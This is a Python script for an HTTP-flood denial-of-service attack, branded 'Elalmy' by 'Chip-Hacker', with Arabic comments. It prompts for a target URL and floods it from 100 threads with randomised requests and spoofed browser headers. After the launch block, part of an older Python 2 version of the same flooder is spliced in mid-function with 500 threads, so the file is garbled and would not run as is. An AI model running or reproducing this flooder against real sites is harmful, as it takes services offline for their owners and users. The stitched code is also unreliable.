import urllib.request
import sys
import threading
import random
import re

# المتغيرات العالمية كما كانت في ملفك الأصلي
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1
    
# قائمة المتصفحات
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
    return(headers_useragents)

# قائمة الـ Referers
def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://' + host + '/')
    return(headers_referers)
    
# بناء نص عشوائي
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)

def httpcall(url):
    useragent_list()
    referer_list()
    if url.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"
    
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Host', host)
    
    try:
        urllib.request.urlopen(request)
        inc_counter()
    except Exception:
        pass

class HTTPThread(threading.Thread):
    def run(self):
        while flag < 2:
            httpcall(url)

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if (previous + 100 < request_counter):
                print(str(request_counter) + " Requests Sent")
                previous = request_counter

# التصميم والشكل المطلوب
print("""
                                      ...
                 ;::::;   Elalmy Starting...
               ;::::; :;    By  Chip-Hacker
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO\
           ::::::;       ;          OOOOO\
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
""")
print('(------------------------Elalmy---------------------------)')

# طلب الرابط من المستخدم
target = input("Enter Target URL: ")
if not target.startswith("http"):
    target = "http://" + target
url = target

m = re.search('http\://([^/]*)/?.*', url)
host = m.group(1)

print("Flooding WebSite: " + host)
for i in range(100):
    t = HTTPThread()
    t.start()
t = MonitorThread()
t.start()
	request.add_header('Connection', 'keep-alive')
	request.add_header('Host',host)
	try:
			urllib2.urlopen(request)
	except urllib2.HTTPError, e:
			#print e.code
			set_flag(1)
 			print 'Flooding WebSite Port 80 with 65000-byte packets for 99999'
			code=500
	except urllib2.URLError, e:
			#print e.reason
			sys.exit()
	else:
			inc_counter()
			urllib2.urlopen(request)
	return(code)		

	
#http caller thread 
class HTTPThread(threading.Thread):
	def run(self):
		try:
			while flag<2:
				code=httpcall(url)
				if (code==500) & (safe==1):
					set_flag(2)
		except Exception, ex:
			pass

# monitors http threads and counts requests
class MonitorThread(threading.Thread):
	def run(self):
		previous=request_counter
		while flag==0:
			if (previous+100<request_counter) & (previous<>request_counter):
				print "%d Shots sends Senting" % (request_counter)
				previous=request_counter
		if flag==2:
			print "\n -M60 Hits are secced"

#execute 
if len(sys.argv) < 2:
	usage()
	sys.exit()
else:
	if sys.argv[1]=="help":
		usage()
		sys.exit()
	else:
		print "Flooding WebSite Port 80 with 65000-byte packets for 99999 By DDoS Attack"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
		if url.count("/")==2:
			url = url + "/"
		m = re.search('http\://([^/]*)/?.*', url)
		host = m.group(1)
		for i in range(500):
			t = HTTPThread()
			t.start()
		t = MonitorThread()
		t.start()
